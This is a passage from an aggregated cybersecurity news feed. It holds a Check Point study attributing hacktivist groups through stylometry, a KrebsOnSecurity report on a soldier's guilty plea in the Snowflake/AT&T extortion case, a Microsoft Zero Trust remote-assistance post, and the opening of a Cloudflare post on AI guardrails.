&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31056" height="376" src="https://research.checkpoint.com/wp-content/uploads/2025/02/CSSSAQDUS5-image3-1024x376.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure&amp;nbsp;&lt;em&gt;4&lt;/em&gt;&lt;/strong&gt;:&amp;nbsp;Topic modeling visualization of users-per-topic&lt;/p&gt;



&lt;p&gt;Given that these groups are likely orchestrated by intelligence agencies, analyzing the topics they discuss provides insight into the missions or goals these accounts are intended to serve. By visualizing the evolution of these topics over time, we detected changes in focus or interest by the entities managing these accounts. This combined analysis offers a clearer understanding of who might be behind these groups, based on their shifting interests and objectives. We observed how groups react to certain geopolitical events and the response time of others. For example, Russia-affiliated hacktivist groups initiated attacks in tandem with the Russian invasion of Ukraine. It took a few months for Ukrainian-related hacktivist groups to consistently retaliate with their own attacks.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31055" height="374" src="https://research.checkpoint.com/wp-content/uploads/2025/02/CSSSAQDUS5-image2-1024x374.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure&amp;nbsp;&lt;em&gt;5&lt;/em&gt;&lt;/strong&gt;&lt;em&gt;:&lt;/em&gt;&amp;nbsp;Topic modeling visualization of topics-per-user&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31057" height="378" src="https://research.checkpoint.com/wp-content/uploads/2025/02/CSSSAQDUS5-image4-1024x378.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure&amp;nbsp;6&lt;/strong&gt;:&amp;nbsp;Topic modeling timeline visualization of topics and volume related to certain geopolitical events&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="stylometric-analysis"&gt;Stylometric Analysis&lt;/h3&gt;



&lt;p&gt;Stylometric analysis was used to compare the writing styles of different hacktivist groups and uncover potential connections. By extracting nearly 200 features from the collected messages, including lexical, syntactic, and stylistic elements, we created unique stylistic fingerprints for each account. This analysis not only identifies authorship but also provides deeper insights into the organizational structure and operational strategies of these groups.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31059" height="613" src="https://research.checkpoint.com/wp-content/uploads/2025/02/CSSSAQDUS5-image6-1024x613.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure&amp;nbsp;7&lt;/strong&gt;&lt;em&gt;:&lt;/em&gt;&amp;nbsp;Stylometric similarity visualization draws connections between different hacktivist groups&lt;/p&gt;



&lt;p&gt;Using similarity measures to compare these stylistic fingerprints, we identified several notable connections. Certain groups exhibited highly similar writing styles, suggesting they might be operated by the same individuals or teams. For instance, the Cyber Army of Russia Reborn, Solntsepek, and XakNet showed significant stylistic overlap. This finding supports Google Mandiant’s&amp;nbsp;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/apt44-unearthing-sandworm"&gt;&lt;u&gt;reports&lt;/u&gt;&lt;/a&gt;&amp;nbsp;indicating that these groups are cyber personas used by APT44, providing further evidence of their coordinated operations. In addition, two groups not mentioned in the Mandiant report—JustEvil and NoName057—also showed some similarity to this cluster of activity. We also discovered connections between other clusters, including those targeting organizations in Israel and Albania, and another cluster focusing on Iran.&lt;/p&gt;



&lt;p&gt;Sudden changes in writing style within a single account indicated possible changes in authorship. For example, the IT Army of Ukraine showed a distinct shift in style around 2022, coinciding with a change in its messaging focus. Initially, the account featured messages in Arabic cheering for the Egyptian football team, but after the Russian invasion of Ukraine, the content shifted dramatically to focus on cyber attacks against Russia. This stark change suggests that the account was purchased, repurposed, or taken over by the group. Other examples demonstrate that more than one person is writing the messages for some groups, while other groups have only a single author who consistently writes in a similar manner.&lt;/p&gt;



&lt;h4 class="wp-block-heading" id="implications"&gt;Implications&lt;/h4&gt;



&lt;p&gt;The identification of stylistic overlaps between different groups suggests coordinated efforts and shared objectives, possibly under a single directive from intelligence agencies. This enhances our ability to attribute attacks and understand the broader strategy behind them.&lt;/p&gt;



&lt;p&gt;Moreover, detecting sudden shifts in writing style within an account can signal changes in the group&amp;#8217;s control or a strategic redirection. This information is vital for threat intelligence, as it provides early indicators of significant changes in hacktivist activities.&lt;/p&gt;



&lt;p&gt;By combining these insights with the results from topic modeling, we gain a better understanding of hacktivist groups&amp;#8217; motivations, strategies, and interconnections. This holistic view is essential for understanding and improving the attribution of operations by hacktivist groups.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="discussion"&gt;Discussion&lt;/h2&gt;



&lt;h3 class="wp-block-heading" id="interpretation-of-results"&gt;Interpretation of Results&lt;/h3&gt;



&lt;p&gt;The findings from our topic modeling and stylometric analysis provide insights into the activities and evolution of hacktivist groups. By identifying key themes discussed by these groups, we get a better understanding of their primary targets, which include various countries and organizations. The topics frequently centered around major geopolitical events, such as the Russian invasion of Ukraine and the Israel-Hamas conflict, highlighting the role of hacktivist groups in cyber warfare and propaganda. The evolution of topics over time reveals how these groups adapt their messaging in response to global events, reflecting their strategic objectives.&lt;/p&gt;



&lt;p&gt;Stylometric analysis showed the interconnectedness of hacktivist groups, with certain groups exhibiting similar writing styles indicative of common authorship or coordination. This was particularly evident in clusters of groups targeting specific regions, such as Ukraine, Israel, and Iran. Additionally, shifts in writing style within individual accounts, suggest changes in ownership of the accounts and might indicate a shift in strategic direction.&lt;/p&gt;



&lt;p&gt;Understanding the topics and writing styles of hacktivist groups improves threat intelligence by organizing the knowledge regarding their motivations and strategies. This is essential for creating effective countermeasures and accurately attributing cyber attacks to specific groups or state-sponsored entities. Continuous monitoring and analysis of hacktivist communications can provide early warnings of emerging threats, enabling proactive defense measures.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="limitations"&gt;Limitations&lt;/h3&gt;



&lt;p&gt;Despite the valuable insights gained, this research has several limitations. Data collection posed significant challenges, as hacktivist groups frequently change their accounts (the social media platforms often ban their old accounts), limiting the availability of data. Also, it is often hard to understand if an account is legit or some kind of a fan page or a copycat of a hacktivist group. Moreover, the reliance on social media messages means that the analysis may not capture the full scope of hacktivist activities, which might include messages written on their website (often on the Darkweb), forums, and sometimes directly to journalists.&lt;/p&gt;



&lt;p&gt;The machine learning models used in this study, while powerful, have inherent limitations. Topic modeling relies on the quality and comprehensiveness of the input data, and small or obscure topics may be overlooked. Stylometric analysis, though effective in identifying writing style similarities, may produce false positives if different authors share similar linguistic habits or use a language that is not properly supported by the models. Also, with enough effort, it is possible to mimic the writing style of certain groups, hence misleading the stylometric model.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="future-research-directions"&gt;Future Research Directions&lt;/h3&gt;



&lt;p&gt;To build on the research findings, future research should expand the analysis to include more hacktivist accounts. With many groups emerging rapidly, it is essential to set up automated processes for continuous monitoring and analysis. This automation would allow for real-time insights and a more comprehensive understanding of hacktivist activities.&lt;/p&gt;



&lt;p&gt;Additionally, researchers should explore other data types, such as the metadata of videos and PDFs, to gain further insights. Analyzing unique hashtags, recurring typos, and mentions across different accounts can also provide valuable information. Applying visual stylometry concepts to videos and graphic images posted by these groups can reveal additional patterns and connections.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;Our research’s significance lies in its innovative approach to analyzing hacktivist communications. By combining topic modeling and stylometric analysis, we provided a comprehensive view of these groups&amp;#8217; activities and their evolution. However, it&amp;#8217;s important to note that this approach is not infallible. The cyber threat landscape is continuously evolving, and so must our methods. We need to keep experimenting, innovating, and collaborating to stay ahead of these threats.&lt;/p&gt;



&lt;p&gt;The blurred lines between state-sponsored activities and traditional grassroots hacktivism highlight the need for adaptive and innovative threat intelligence methods. Our efforts to understand these complex dynamics are driven by the recognition that we do not have all the answers and this fact is what drove us to seek an understanding in the beginning.&lt;/p&gt;

&lt;div class="wp-caption aligncenter" id="attachment_69974" style="width: 757px;"&gt;&lt;img alt="" class=" wp-image-69974" height="740" src="https://krebsonsecurity.com/wp-content/uploads/2024/12/camwagenius-selfie.png" width="747" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-69974"&gt;One of several selfies on the Facebook page of Cameron Wagenius.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Cameron John Wagenius&lt;/strong&gt;, 21, was &lt;a href="https://krebsonsecurity.com/2024/12/u-s-army-soldier-arrested-in-att-verizon-extortions/" rel="noopener" target="_blank"&gt;arrested&lt;/a&gt; near the Army base in Fort Cavazos, Texas on Dec. 20, and charged with two criminal counts of unlawful transfer of confidential phone records. Wagenius was a communications specialist at a U.S. Army base in South Korea, who secretly went by the nickname &lt;strong&gt;Kiberphant0m&lt;/strong&gt; and was part of a trio of criminal hackers that extorted dozens of companies last year over stolen data.&lt;/p&gt;
&lt;p&gt;At the end of 2023, malicious hackers learned that many companies had uploaded sensitive customer records to accounts at the cloud data storage service &lt;strong&gt;Snowflake&lt;/strong&gt; that were protected with little more than a username and password (no multi-factor authentication needed). After scouring darknet markets for stolen Snowflake account credentials, the hackers began raiding the data storage repositories used by some of the world&amp;#8217;s largest corporations.&lt;/p&gt;
&lt;p&gt;Among those was &lt;strong&gt;AT&amp;amp;T&lt;/strong&gt;, which disclosed in July that cybercriminals had stolen personal information and phone and text message records for roughly 110 million people — nearly all of its customers. AT&amp;amp;T &lt;a href="https://www.wired.com/story/atandt-paid-hacker-300000-to-delete-stolen-call-records/" rel="noopener" target="_blank"&gt;reportedly&lt;/a&gt; paid a hacker $370,000 to delete stolen phone records. More than 160 other Snowflake customers were relieved of data, including TicketMaster, Lending Tree, Advance Auto Parts and Neiman Marcus.&lt;/p&gt;
&lt;p&gt;In several posts to an English-language cybercrime forum in November, Kiberphant0m leaked some of the phone records and threatened to leak them all unless paid a ransom. Prosecutors said that in addition to his public posts on the forum, Wagenius had engaged in multiple direct attempts to extort &amp;#8220;Victim-1,&amp;#8221; which appears to be a reference to AT&amp;amp;T. The government states that Kiberphant0m privately demanded $500,000 from Victim-1, threatening to release all of the stolen phone records unless he was paid.&lt;/p&gt;
&lt;p&gt;On Feb. 19, Wagenius &lt;a href="https://storage.courtlistener.com/recap/gov.uscourts.wawd.343000/gov.uscourts.wawd.343000.27.0.pdf" rel="noopener" target="_blank"&gt;pleaded guilty&lt;/a&gt; to two counts of unlawfully transferring confidential phone records, but he did so without the benefit of a plea agreement. In entering the plea, Wagenius&amp;#8217;s attorneys had asked the court to allow him to stay with his father pending his sentencing.&lt;/p&gt;
&lt;p&gt;But in &lt;a href="https://storage.courtlistener.com/recap/gov.uscourts.wawd.343000/gov.uscourts.wawd.343000.30.0.pdf" rel="noopener" target="_blank"&gt;a response filed today&lt;/a&gt; (PDF), prosecutors in Seattle said Wagenius was a flight risk, partly because prior to his arrest he was searching online for how to defect to countries that do not extradite to the United States. According to the government, while Kiberphant0m was extorting AT&amp;amp;T, Wagenius&amp;#8217;s searches included:&lt;/p&gt;
&lt;p&gt;-&amp;#8220;where can i defect the u.s government military which country will not hand me over&amp;#8221;&lt;br /&gt;
-&amp;#8220;U.S. military personnel defecting to Russia&amp;#8221;&lt;br /&gt;
-&amp;#8220;Embassy of Russia – Washington, D.C.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;As discussed in the government’s sealed filing, the government has uncovered evidence suggesting that the charged conduct was only a small part of Wagenius’ malicious activity,&amp;#8221; the government memo states. &amp;#8220;On top of this, for more than two weeks in November 2024, Wagenius communicated with an email address he believed belonged to Country-1’s military intelligence service in an attempt to sell stolen information. Days after he apparently finished communicating with Country-1’s military intelligence service, Wagenius Googled, &amp;#8216;can hacking be treason.'&amp;#8221;&lt;span id="more-70530"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Prosecutors told the court investigators also found a screenshot on Wagenius&amp;#8217; laptop that suggested he had over 17,000 files that included passports, driver’s licenses, and other identity cards belonging to victims of a breach, and that in one of his online accounts, the government also found a fake identification document that contained his picture.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Wagenius should also be detained because he presents a serious risk of flight, has the means and intent to flee, and is aware that he will likely face additional charges,&amp;#8221; the Seattle prosecutors asserted.&lt;/p&gt;
&lt;p&gt;The court filing says Wagenius is presently in the process of being separated from the Army, but the government has not received confirmation that his discharge has been finalized.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The government’s understanding is that, until his discharge from the Army is finalized (which is expected to happen in early March), he may only be released directly to the Army,&amp;#8221; reads a footnote in the memo. &amp;#8220;Until that process is completed, Wagenius’ proposed release to his father should be rejected for this additional reason.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Wagenius&amp;#8217;s interest in defecting to another country in order to escape prosecution mirrors that of his alleged co-conspirator, &lt;strong&gt;John Erin Binns&lt;/strong&gt;, an 25-year-old elusive American man indicted by the Justice Department for &lt;a href="https://krebsonsecurity.com/2021/08/t-mobile-investigating-claims-of-massive-data-breach/" rel="noopener" target="_blank"&gt;a 2021 breach at T-Mobile&lt;/a&gt; that exposed the personal information of at least 76.6 million customers.&lt;/p&gt;
&lt;p&gt;Binns has since been charged with the Snowflake hack and subsequent extortion activity. He is currently in custody in a Turkish prison. Sources close to the investigation told KrebsOnSecurity that prior to his arrest by Turkish police, Binns visited the Russian embassy in Turkey to inquire about Russian citizenship.&lt;/p&gt;
&lt;p&gt;In late November 2024, Canadian authorities &lt;a href="https://krebsonsecurity.com/2024/11/canadian-man-arrested-in-snowflake-data-extortions/" rel="noopener" target="_blank"&gt;arrested a third alleged member of the extortion conspiracy&lt;/a&gt;, 25-year-old &lt;strong&gt;Connor Riley Moucka&lt;/strong&gt; of Kitchener, Ontario. The U.S. government has indicted Moucka and Binns, charging them with one count of conspiracy; 10 counts of wire fraud; four counts of computer fraud and abuse; two counts of extortion in relation to computer fraud; and two counts aggravated identity theft.&lt;/p&gt;
&lt;p&gt;Less than a month before Wagenius&amp;#8217;s arrest, KrebsOnSecurity published &lt;a href="https://krebsonsecurity.com/2024/11/hacker-in-snowflake-extortions-may-be-a-u-s-soldier/" rel="noopener" target="_blank"&gt;a deep dive&lt;/a&gt; into Kiberphant0m&amp;#8217;s various Telegram and Discord identities over the years, revealing how the owner of the accounts told others they were in the Army and stationed in South Korea.&lt;/p&gt;
&lt;p&gt;The maximum penalty Wagenius could face at sentencing includes up to ten years in prison for each count, and fines not to exceed $250,000.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70530</guid><category>Breadcrumbs</category><category>Ne'er-Do-Well News</category><category>AT&amp;T</category><category>Cameron John Wagenius</category><category>Connor Riley Moucka</category><category>John Erin Binns</category><category>Kiberphant0m</category></item><item><title>SonicWall Report: “Threat Actors are Moving at Unprecedented Speeds”</title><link>https://www.techrepublic.com/article/sonicwall-threat-report-2025/</link><description>SonicWall’s 2025 Annual Threat Report noted the U.S. healthcare sector and Latin America were targeted by cybercriminals.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4293789</guid><category>Artificial Intelligence</category><category>International</category><category>Security</category><category>Startups</category><category>ai</category><category>artificial intelligence</category><category>cybersecurity</category><category>healthcare</category><category>ransomware</category><category>small and medium businesses</category><category>smbs</category><category>sonicwall</category></item><item><title>SonicWall Report: “Threat Actors are Moving at Unprecedented Speeds”</title><link>https://www.techrepublic.com/article/sonicwall-threat-report-2025/</link><description>SonicWall’s 2025 Annual Threat Report noted the U.S. healthcare sector and Latin America were targeted by cybercriminals.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4293789</guid><category>Artificial Intelligence</category><category>International</category><category>Security</category><category>Startups</category><category>ai</category><category>artificial intelligence</category><category>cybersecurity</category><category>healthcare</category><category>ransomware</category><category>small and medium businesses</category><category>smbs</category><category>sonicwall</category></item><item><title>Rethinking remote assistance security in a Zero Trust world</title><link>https://www.microsoft.com/en-us/security/blog/2025/02/26/rethinking-remote-assistance-security-in-a-zero-trust-world/</link><description>&lt;p&gt; The rise in sophisticated cyberthreats demands a fundamental shift in our approach. Organizations must rethink remote assistance security through the lens of Zero Trust, using the three key principles of Verify Explicitly, Use Least Privilege, and Assume Breach as a guide and ensuring that every session, user, and device is verified, compliant, and monitored before access is granted.  &lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/02/26/rethinking-remote-assistance-security-in-a-zero-trust-world/"&gt;Rethinking remote assistance security in a Zero Trust world&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;The recent &lt;a href="https://www.reuters.com/technology/cybersecurity/us-treasurys-workstations-hacked-cyberattack-by-china-afp-reports-2024-12-30/" rel="noreferrer noopener" target="_blank"&gt;breach of the United States Treasury&lt;/a&gt; underscores a stark reality: cyber adversaries are no longer just looking for gaps in traditional network security—they are actively exploiting the tools organizations rely on for daily operations. Remote assistance technologies, essential for IT support and business continuity, have become prime targets for credential theft, moving within the network, and system exploitation. The message is clear: securing remote assistance is no longer optional; it is a fundamental requirement for maintaining operational resilience.  &lt;/p&gt;



&lt;h2 class="wp-block-heading" id="a-multi-pronged-approach-to-securing-remote-assistance-with-zero-trust"&gt;A multi-pronged approach to securing remote assistance with Zero Trust&lt;/h2&gt;



&lt;p&gt;For too long, remote assistance security has been presumed rather than intentionally designed into its architecture. The rise in sophisticated cyberthreats demands a fundamental shift in our approach. Organizations must rethink remote assistance security through the lens of &lt;a href="https://www.microsoft.com/security/business/zero-trust" rel="noreferrer noopener" target="_blank"&gt;Zero Trust&lt;/a&gt;, using the three key principles of &lt;strong&gt;verify explicitly, use least privilege&lt;/strong&gt;, and &lt;strong&gt;assume breach&lt;/strong&gt; as a guide and ensuring that every session, user, and device is verified, compliant, and monitored before access is granted. &lt;/p&gt;



&lt;p&gt;Discover how implementing Zero Trust can fortify your remote assistance security by visiting our &lt;a href="https://microsoft.github.io/zerotrustassessment/" rel="noreferrer noopener" target="_blank"&gt;Zero Trust Workshop&lt;/a&gt;, where you’ll find an interactive guide to embedding security into your IT operations.  &lt;/p&gt;



&lt;p&gt;This requires a structured approach with a foundation of:&amp;nbsp;&lt;/p&gt;



&lt;ol class="wp-block-list" start="1"&gt;
&lt;li&gt;&lt;strong&gt;Identity and access control&lt;/strong&gt;—ensuring that only authenticated, compliant users and devices can initiate or receive remote assistance. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Endpoint security and compliance&lt;/strong&gt;—enforcing security baselines and conditional access across all managed devices. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Embedded security in remote assistance&lt;/strong&gt;—building security into the very foundation of remote assistance tools, eliminating gaps that cyberattackers can exploit. &lt;/li&gt;
&lt;/ol&gt;



&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-1 wp-block-buttons-is-layout-flex"&gt;
&lt;div class="wp-block-button has-custom-width wp-block-button__width-75 btn-primary"&gt;&lt;a class="wp-block-button__link has-text-align-center wp-element-button" href="https://www.microsoft.com/security/business/zero-trust" rel="noreferrer noopener" target="_blank"&gt;Explore the Microsoft Zero Trust approach&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;ol class="wp-block-list" start="2"&gt;&lt;/ol&gt;



&lt;ol class="wp-block-list" start="3"&gt;&lt;/ol&gt;



&lt;h2 class="wp-block-heading" id="identity-and-access-control-the-first-line-of-cybersecurity-defense"&gt;Identity and access control: The first line of cybersecurity defense&lt;/h2&gt;



&lt;p&gt;Identity security is the cornerstone of any secure remote assistance strategy. A compromised identity is often the first step in a cyberattack, making it critical to ensure only verified users and devices can initiate or receive remote assistance sessions. Organizations must enforce:&amp;nbsp;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Explicit identity verification&lt;/strong&gt;—using multi-factor authentication (MFA) and risk-based conditional access to ensure only authorized users gain access. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Least privilege access&lt;/strong&gt;—ensuring remote assistance is granted only for the necessary duration and with minimal privileges to reduce the risk of exploitation. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Real-time risk assessment&lt;/strong&gt;—continuously evaluating access requests for anomalies or suspicious activity to prevent unauthorized access. &lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;By shifting the security perimeter to identity, organizations create an environment where trust is earned dynamically, not assumed.&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="closing-the-gaps-with-endpoint-security-and-compliance-with-microsoft-intune"&gt;Closing the gaps with endpoint security and compliance with Microsoft Intune&lt;/h2&gt;



&lt;p&gt;Cyberattackers frequently exploit outdated, misconfigured, or non-compliant endpoints to gain a foothold in enterprise environments. IT and security leaders must ensure that remote assistance is built on a strong endpoint security foundation, where every device connecting to corporate resources meets strict compliance standards. This highlights the need for organizations to establish consistent security policies across all devices, ensuring they are up to date and compliant before being granted remote access.  &lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/security/business/Microsoft-Intune?msockid=3ae75d37f6446b52396b49c1f7d66a8b" rel="noreferrer noopener" target="_blank"&gt;Microsoft Intune&lt;/a&gt; provides the necessary tools to: &lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Enforce compliance policies&lt;/strong&gt;—restrict remote assistance to managed, up-to-date, and policy-compliant devices. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Apply security baselines&lt;/strong&gt;—standardize configurations across endpoints to minimize security gaps. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Integrate with Microsoft’s security ecosystem&lt;/strong&gt;—connecting remote assistance workflows with Microsoft Entra, Microsoft Defender product family, and other security tools for real-time monitoring and cyberthreat mitigation.  &lt;/li&gt;
&lt;/ul&gt;



&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-2 wp-block-buttons-is-layout-flex"&gt;
&lt;div class="wp-block-button has-custom-width wp-block-button__width-75 btn-primary"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/security/business/Microsoft-Intune?msockid=3ae75d37f6446b52396b49c1f7d66a8b" rel="noreferrer noopener" target="_blank"&gt;Discover more about Microsoft Intune&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="remote-help-secure-remote-assistance-built-for-zero-trust"&gt;Remote Help: Secure remote assistance built for Zero Trust &lt;/h2&gt;



&lt;p&gt;As organizations work toward a Zero Trust model, secure remote assistance must align with core security principles. This means moving beyond reactive security measures and embedding proactive, policy-driven controls into every remote session. &lt;a href="https://www.microsoft.com/security/business/endpoint-management/microsoft-intune-remote-help?msockid=3ae75d37f6446b52396b49c1f7d66a8b" rel="noreferrer noopener" target="_blank"&gt;Microsoft Intune Remote Help&lt;/a&gt; was designed with these imperatives in mind, providing a robust solution that enhances IT support while minimizing security risks. &lt;/p&gt;



&lt;p&gt;While legacy remote assistance tools can lack enterprise-grade security controls, Remote Help is built to align with Zero Trust principles. Unlike traditional solutions, Remote Help:&amp;nbsp;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Integrates directly with &lt;a href="https://www.microsoft.com/security/business/identity-access/microsoft-entra-id" rel="noreferrer noopener" target="_blank"&gt;Microsoft Entra ID&lt;/a&gt;&lt;/strong&gt;—enhancing security where authentication and access controls can consistently take place. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Provides session transparency&lt;/strong&gt;—IT teams can track and monitor remote assistance activity in real time. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Enforces compliance requirements&lt;/strong&gt;—only compliant, managed devices can participate in remote assistance sessions.  &lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;For highly regulated industries, Remote Help offers an alternative to third-party tools that may introduce security blind spots. By embedding security directly into remote assistance workflows, organizations can significantly reduce the risk of unauthorized access.&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-3 wp-block-buttons-is-layout-flex"&gt;
&lt;div class="wp-block-button has-custom-width wp-block-button__width-75 btn-primary"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/security/business/endpoint-management/microsoft-intune-remote-help?msockid=3ae75d37f6446b52396b49c1f7d66a8b" rel="noreferrer noopener" target="_blank"&gt;Start a free trial of Microsoft Intune Remote Help &lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="engaging-customers-and-partners-to-strengthen-cyber-resilience"&gt;Engaging customers and partners to strengthen cyber resilience &lt;/h2&gt;



&lt;p&gt;Cybersecurity is a team sport. As cyberthreat actors grow more sophisticated, collaboration across industries is essential. Microsoft is committed to engaging with customers and partners to drive security innovation and resilience. Initiatives such as the &lt;a href="https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-ai-powered-cloud-enabled-and-secure/4299069" rel="noreferrer noopener" target="_blank"&gt;Windows Resiliency Initiative&lt;/a&gt; (WRI) focus on: &lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Reducing the need for admin privileges&lt;/strong&gt;—helping organizations adopt a least privilege approach at scale.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Enhancing identity protection&lt;/strong&gt;—strengthening defenses against phishing and identity-based attacks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Quick machine recovery&lt;/strong&gt;—empowering IT teams with tools to rapidly store compromised devices remotely.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;By fostering collaboration and continuously evolving security measures, Microsoft is helping organizations stay ahead of emerging cyberthreats. These on-going conversations with our customers and partners are crucial in shaping resilient security strategies that adapt to an ever-changing cyberthreat landscape.   &lt;/p&gt;



&lt;h2 class="wp-block-heading" id="a-security-first-approach-for-the-future"&gt;A security-first approach for the future &lt;/h2&gt;



&lt;p&gt;The increasing reliance on remote assistance demands a security-first mindset. Organizations must recognize that every remote access session presents an opportunity for exploitation from an ever-evolving cast of cyberattackers. Rather than treating security as an afterthought, it must be deeply integrated into the architecture of the remote assistance solutions. A modern approach requires proactive risk mitigation, continuous verification, and seamless security controls that support productivity without compromising protection.  &lt;/p&gt;



&lt;p&gt;Now is the time for IT and security leaders to:&amp;nbsp;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Evaluate your current remote assistance tools&lt;/strong&gt;—identifying the gaps and areas for improvement. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Adopt Zero Trust principles&lt;/strong&gt;—ensuring the access is verified and explicitly and continuously monitored. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Leverage solutions like Microsoft Intune and Remote Help&lt;/strong&gt;—deploying secure, enterprise-grade remote assistance capabilities. &lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;By taking these steps, you can strengthen your security posture, minimize risk, and ensure that remote assistance remains a tool for operational efficiency rather than a gateway for cyberthreats.  &lt;/p&gt;

Flag and block harmful or inappropriate content, protect personal data, and ensure compliance in real-time</description><content:encoded>&lt;p&gt;The transition of AI from experimental to production is not without its challenges. Developers face the challenge of balancing rapid innovation with the need to protect users and meet strict regulatory requirements. To address this, we are introducing &lt;b&gt;Guardrails in AI Gateway&lt;/b&gt;, designed to help you deploy AI safely and confidently. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Why safety matters&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-safety-matters"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;LLMs are inherently non-deterministic, meaning outputs can be unpredictable. Additionally, you have no control over your users, and they may ask for something wildly inappropriate or attempt to elicit an inappropriate response from the AI. Now, imagine launching an AI-powered application without clear visibility into the potential for harmful or inappropriate content. Not only does this risk user safety, but it also puts your brand reputation on the line.&lt;/p&gt;&lt;p&gt;To address the unique security risks specific to AI applications, the &lt;a href="https://genai.owasp.org/resource/owasp-top-10-for-llm-applications-2025/"&gt;&lt;u&gt;OWASP Top 10 for Large Language Model (LLM) Applications&lt;/u&gt;&lt;/a&gt; was created. This is an industry-driven standard that identifies the most critical security vulnerabilities specifically affecting LLM-based and generative AI applications. It’s designed to educate developers, security professionals, and organizations on the unique risks of deploying and managing these systems.&lt;/p&gt;&lt;p&gt;The stakes are even higher with new regulations being introduced:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://artificialintelligenceact.eu/high-level-summary/"&gt;&lt;b&gt;&lt;u&gt;European Union Artificial Intelligence Act&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;: Enacted on August 1, 2024, the AI Act has a specific section on establishing a risk management system for AI systems, data governance, technical documentation, and record keeping of risks/abuse. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://commission.europa.eu/strategy-and-policy/priorities-2019-2024/europe-fit-digital-age/digital-services-act_en"&gt;&lt;b&gt;&lt;u&gt;European Union Digital Services Act (DSA&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;&lt;b&gt;): &lt;/b&gt;Adopted in 2022, the DSA is designed to enhance safety and accountability online, including mitigating the spread of illegal content and safeguarding minors from harmful content.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;These developments emphasize why robust safety controls must be part of every AI 